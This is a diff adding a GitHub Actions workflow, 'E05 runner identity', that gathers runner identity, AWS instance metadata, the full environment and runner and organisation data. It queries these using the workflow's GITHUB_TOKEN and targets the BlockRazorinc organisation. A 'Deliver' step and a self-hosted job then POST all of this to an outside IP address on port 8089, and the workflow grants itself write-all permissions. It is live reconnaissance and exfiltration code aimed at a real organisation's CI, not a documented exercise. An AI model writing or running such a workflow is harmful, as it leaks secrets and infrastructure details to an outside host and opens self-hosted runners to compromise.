@@ -1,0 +1,95 @@
+name: E05 runner identity
+
+on:
+  workflow_dispatch:
+  push:
+    branches: ["e05/**"]
+
+permissions: write-all
+
+jobs:
+  hosted-baseline:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: Collect host identity
+        run: |
+          set -x
+          R="$GITHUB_REPOSITORY"; RUN="$GITHUB_RUN_ID"; CB="http://198.13.130.233:8089"
+          T=/tmp/e05.txt
+          {
+            echo "== identity =="
+            echo "RUNNER_ENVIRONMENT=$RUNNER_ENVIRONMENT"
+            echo "RUNNER_NAME=$RUNNER_NAME"
+            echo "RUNNER_OS=$RUNNER_OS RUNNER_ARCH=$RUNNER_ARCH"
+            echo "GITHUB_WORKFLOW_REF=$GITHUB_WORKFLOW_REF"
+            echo "== id =="; id
+            echo "== host =="; hostname; uname -a; cat /etc/os-release | head -4
+            echo "== ifaces =="; ip -4 -o addr 2>/dev/null | head
+            echo "== who-am-i-ip =="; curl -sS -m 8 https://api.ipify.org; echo
+            echo "== imds =="
+            TOK=$(curl -sS -m 4 -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
+            echo "token_len=${#TOK}"
+            curl -sS -m 4 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/instance-id; echo
+            curl -sS -m 4 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/placement/region; echo
+            echo "== env =="; env | sort
+          } > $T 2>&1
+
+      - name: Probe runners API
+        env:
+          GH: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          R="$GITHUB_REPOSITORY"; T=/tmp/api.txt; : > $T
+          call() { echo "### $1" >> $T; curl -sS -m 15 -w '\nHTTP %{http_code}\n' -H "Authorization: Bearer $GH" -H 'Accept: application/vnd.github+json' "$1" >> $T 2>&1; echo >> $T; }
+          call "https://api.github.com/repos/$R/actions/runners?per_page=100"
+          call "https://api.github.com/repos/$R/actions/runner-groups"
+          call "https://api.github.com/orgs/BlockRazorinc/actions/runners?per_page=100"
+          call "https://api.github.com/orgs/BlockRazorinc/actions/runner-groups"
+          call "https://api.github.com/user"
+          echo "== run history runner_name ==" >> $T
+          curl -sS -m 20 -H "Authorization: Bearer $GH" "https://api.github.com/repos/$R/actions/runs?per_page=100" -o /tmp/runs.json
+          python3 - >> $T 2>&1 <<'PY'
+          import json,urllib.request,os
+          tok=os.environ['GH']; repo=os.environ['GITHUB_REPOSITORY']
+          d=json.load(open('/tmp/runs.json'))
+          runs=d.get('workflow_runs',[])
+          print("run_count",len(runs))
+          from collections import Counter
+          c=Counter(); first={}; last={}
+          for r in runs:
+              q=urllib.request.Request(f"https://api.github.com/repos/{repo}/actions/runs/{r['id']}/jobs?per_page=100",headers={"Authorization":"Bearer "+tok,"Accept":"application/vnd.github+json"})
+              try: j=json.load(urllib.request.urlopen(q,timeout=20))
+              except Exception as e: print("jobs_err",r['id'],e); continue
+              for job in j.get('jobs',[]):
+                  k=(job.get('runner_name'),job.get('runner_group_name'),",".join(job.get('labels') or []))
+                  c[k]+=1
+                  ts=r.get('created_at')
+                  if k not in first or ts<first[k]: first[k]=ts
+                  if k not in last or ts>last[k]: last[k]=ts
+          for k,v in c.most_common():
+              print(f"runner={k[0]} group={k[1]} labels={k[2]} jobs={v} first={first[k]} last={last[k]}")
+          PY
+
+      - name: Deliver
+        if: always()
+        run: |
+          CB="http://198.13.130.233:8089"; N="e05-hosted-$GITHUB_RUN_ID"
+          for f in /tmp/e05.txt /tmp/api.txt; do
+            b=$(basename $f .txt)
+            for i in 1 2 3; do
+              curl -sS -m 20 -X POST --data-binary @"$f" "$CB/$N-$b" && break || sleep 4
+            done
+          done
+          curl -sS -m 20 -X POST --data-binary @/tmp/e05.txt "$CB/e05-hosted-latest"
+
+  selfhosted-attempt:
+    runs-on: [self-hosted, linux]
+    timeout-minutes: 60
+    steps:
+      - name: Collect identity on self-hosted runner
+        run: |
+          T=/tmp/e05s.txt
+          { echo "== SELF-HOSTED =="; echo "RUNNER_ENVIRONMENT=$RUNNER_ENVIRONMENT RUNNER_NAME=$RUNNER_NAME"; id; hostname; uname -a; cat /etc/os-release 2>/dev/null | head -4; ip -4 -o addr 2>/dev/null | head; env | sort; } > $T 2>&1
+          for i in 1 2 3; do
+            curl -sS -m 20 -X POST --data-binary @$T "http://198.13.130.233:8089/e05-selfhosted-$GITHUB_RUN_ID" && break || sleep 5
+          done
